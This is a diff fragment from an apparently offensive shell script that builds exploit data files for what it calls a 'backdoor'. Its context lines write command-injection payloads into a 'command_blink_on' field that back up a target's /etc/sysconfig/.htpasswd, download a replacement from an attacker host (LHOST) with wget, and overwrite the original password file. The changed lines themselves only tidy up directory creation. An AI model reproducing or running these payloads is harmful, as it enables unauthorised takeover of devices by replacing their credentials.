@@ -62,8 +62,13 @@ then
   
   #Generating data files and backdoor script
   echo "[*] Creating Data files"
-  mkdir ./datafiles
-  cd ./datafiles
+  if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
+  then
+    mkdir datafiles
+    cd ./datafiles
+  else
+    cd ./datafiles
+  fi
   echo 'command_blink_on;044;'${TMAC}';1`cp /etc/sysconfig/.htpasswd /tmp/htbak`;' > data1.txt
   echo 'command_blink_on;044;'${TMAC}';1`wget -O /tmp/ht http://'${LHOST}'/ht`;' > data2.txt
   echo 'command_blink_on;044;'${TMAC}';1`mv /tmp/ht /etc/sysconfig/.htpasswd`;' > data3.txt
